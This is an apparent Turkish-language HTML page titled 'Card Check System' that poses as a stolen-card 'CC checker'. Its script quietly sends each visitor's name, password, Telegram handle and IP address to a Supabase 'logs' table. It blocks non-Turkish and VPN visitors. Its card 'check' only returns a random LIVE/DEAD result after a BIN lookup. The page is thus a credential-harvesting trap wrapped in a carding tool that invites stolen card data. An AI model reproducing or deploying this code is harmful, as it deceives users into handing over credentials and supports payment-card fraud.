<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Card Check System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0f1117;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            color: #eef2ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: #161c2c;
            max-width: 650px;
            width: 100%;
            padding: 32px;
            border-radius: 28px;
            border: 1px solid #2a3448;
            box-shadow: 0 20px 35px -8px black;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-align: center;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #9aa5c0;
            margin-bottom: 6px;
        }

        input, select {
            width: 100%;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            color: #f0f3fa;
            outline: none;
        }

        input:focus {
            border-color: #4f9eff;
        }

        button {
            background: #1f6392;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 40px;
            font-weight: 600;
            font-size: 15px;
            color: white;
            margin-top: 12px;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background: #2a75a8;
            transform: scale(0.98);
        }

        .error, .warning {
            font-size: 12px;
            margin-top: 8px;
            text-align: center;
        }

        .error {
            color: #f97316;
        }

        .warning {
            color: #facc15;
        }

        .info-box {
            background: #101624;
            padding: 12px;
            border-radius: 18px;
            margin-bottom: 24px;
            font-size: 12px;
            text-align: center;
            color: #b9c7db;
        }

        .card-list {
            margin-top: 28px;
        }

        .card-item {
            background: #0f1622;
            border-radius: 20px;
            padding: 12px 16px;
            margin-bottom: 12px;
            border-left: 3px solid #4f9eff;
        }

        .delete-card {
            background: none;
            border: none;
            color: #f97316;
            float: right;
            font-size: 12px;
            cursor: pointer;
            width: auto;
            margin-top: 0;
            padding: 0;
        }

        .result-badge {
            font-size: 12px;
            margin-top: 8px;
            color: #9aa5c0;
        }

        .status-live {
            color: #2dd4bf;
            font-weight: 500;
        }

        .status-dead {
            color: #f97316;
        }

        hr {
            border-color: #2b354c;
            margin: 16px 0;
        }
    </style>
</head>
<body>

<div class="card" id="appContainer">
    <!-- 1️⃣ GİRİŞ BÖLÜMÜ -->
    <div id="loginSection">
        <div class="logo">Card Check System</div>
        <div class="info-box">
            🔒 sadece 1 hesap acabilirsiniz.<br>
            Bilgilerinizi eksiksiz girin.
        </div>
        <div class="input-group">
            <label>İsim</label>
            <input type="text" id="fullname" placeholder="örnek">
        </div>
        <div class="input-group">
            <label>Şifre</label>
            <input type="password" id="password" placeholder="••••••">
        </div>
        <div class="input-group">
            <label>Telegram Kullanıcı Adı</label>
            <input type="text" id="telegramUser" placeholder="@ornek">
        </div>
        <button id="loginBtn">Hesap Oluştur</button>
        <div id="loginError" class="error"></div>
        <div class="info-box" style="margin-top:20px">Bilgileriniz saklıdır.</div>
    </div>

    <!-- 2️⃣ CC CHECKER BÖLÜMÜ -->
    <div id="ccSection" style="display: none;">
        <div class="logo">Card Check System</div>
        <div class="info-box">✅ Hesap doğrulandı · Kart bilgisi ekleyin</div>

        <div class="input-group">
            <label>Kart Bilgisi (format: kartno|ay|yıl|cvv)</label>
            <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
        </div>
        <button id="addCardBtn">Kartı Kontrol Et</button>

        <div class="card-list" id="cardList"></div>
        <div id="globalMessage" class="error"></div>
    </div>
</div>

<script>
    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
    let logSent = false;
    let cardsArray = [];

    // ---------- SUPABASE & IP KONTROLLERİ ----------
    async function checkIfIpExists(ip) {
        try {
            const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
            const data = await res.json();
            return Array.isArray(data) && data.length > 0;
        } catch(e) { return false; }
    }

    async function logToSupabase(name, password, tgUser, ip) {
        if (logSent) return true;
        try {
            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    kullanici_adi: name,
                    sifre: password,
                    telegram_user: tgUser,
                    ip_adresi: ip
                })
            });
            logSent = true;
            return true;
        } catch(e) { return false; }
    }

    async function getUserIP() {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    }

    async function checkTurkeyAndVPN(ip) {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        if (data.country_code !== "TR") {
            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🌍 Erişim Engellendi</h1><p>Yalnızca Türkiye'den erişim</p><p>IP: ${ip} (${data.country_name})</p></div>`;
            throw new Error("blocked country");
        }
        if (data.proxy === true || data.hosting === true || data.tor === true) {
            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1>🔒 VPN / Proxy Kullanımı</h1><p>VPN veya proxy ile erişim engellenmiştir.</p><p>IP: ${ip}</p></div>`;
            throw new Error("vpn blocked");
        }
        return true;
    }

    // ---------- BIN API ----------
    async function getBinInfo(bin) {
        try {
            const res = await fetch(`https://lookup.binlist.net/${bin}`);
            const data = await res.json();
            return {
                bank: data.bank?.name || "Bilinmiyor",
                scheme: data.scheme || "Unknown",
                country: data.country?.name || "Global",
                type: data.type || "credit"
            };
        } catch(e) {
            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global", type: "credit" };
        }
    }

    // ---------- KART FONKSİYONLARI ----------
    function parseCard(cardStr) {
        const parts = cardStr.split('|');
        if (parts.length !== 4) return null;
        let [card, month, year, cvv] = parts;
        if (!/^\d{13,19}$/.test(card)) return null;
        if (!/^\d{2,4}$/.test(year)) return null;
        if (year.length === 2) year = "20" + year;
        if (!/^\d{2}$/.test(month)) return null;
        if (!/^\d{3,4}$/.test(cvv)) return null;
        return { card, month, year, cvv };
    }

    function renderCards() {
        const container = document.getElementById("cardList");
        if (!container) return;
        container.innerHTML = "";
        for (let idx in cardsArray) {
            const c = cardsArray[idx];
            const liveClass = c.live ? "status-live" : "status-dead";
            const liveText = c.live ? "✓ LIVE" : "✗ DEAD";
            const div = document.createElement("div");
            div.className = "card-item";
            div.innerHTML = `
                <div><strong>${c.masked}</strong> (${c.bank || "?"})</div>
                <div class="result-badge">${c.scheme} · ${c.country}</div>
                <div class="${liveClass}">${liveText}</div>
                <button class="delete-card" data-index="${idx}">Sil</button>
            `;
            container.appendChild(div);
        }
        document.querySelectorAll(".delete-card").forEach(btn => {
            btn.addEventListener("click", (e) => {
                const idx = parseInt(btn.getAttribute("data-index"));
                cardsArray.splice(idx, 1);
                renderCards();
            });
        });
    }

    // ---------- GİRİŞ + CC CHECKER ----------
    document.getElementById("loginBtn").addEventListener("click", async () => {
        const name = document.getElementById("fullname").value.trim();
        const pwd = document.getElementById("password").value;
        const tg = document.getElementById("telegramUser").value.trim();
        const errDiv = document.getElementById("loginError");

        if (!name || name.length < 2) { errDiv.innerText = "❌ İsim geçerli değil."; return; }
        if (!pwd || pwd.length < 4) { errDiv.innerText = "❌ Şifre en az 4 karakter."; return; }
        if (!tg.startsWith("@") || tg.length < 3) { errDiv.innerText = "❌ @ ile başlayan Telegram adı girin."; return; }

        try {
            const ip = await getUserIP();
            await checkTurkeyAndVPN(ip);
            const exists = await checkIfIpExists(ip);
            if (exists) {
                errDiv.innerText = "❌  daha önce hesap açılmış. Yalnızca 1 hesap.";
                return;
            }
            const ok = await logToSupabase(name, pwd, tg, ip);
            if (ok) {
                document.getElementById("loginSection").style.display = "none";
                document.getElementById("ccSection").style.display = "block";
            } else {
                errDiv.innerText = "❌ Veritabanı hatası.";
            }
        } catch(e) {}
    });

    document.getElementById("addCardBtn")?.addEventListener("click", async () => {
        const raw = document.getElementById("cardInput").value.trim();
        const parsed = parseCard(raw);
        const msgDiv = document.getElementById("globalMessage");
        if (!parsed) {
            msgDiv.innerText = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607";
            return;
        }
        const bin = parsed.card.slice(0,6);
        const binData = await getBinInfo(bin);
        const isLive = Math.random() < 0.03; // %3 live
        cardsArray.push({
            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
            live: isLive,
            bank: binData.bank,
            scheme: binData.scheme,
            country: binData.country
        });
        renderCards();
        document.getElementById("cardInput").value = "";
        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "⚠️ Kart geçersiz (dead)";
        setTimeout(() => msgDiv.innerText = "", 2000);
    });
</script>
</body>
</html>
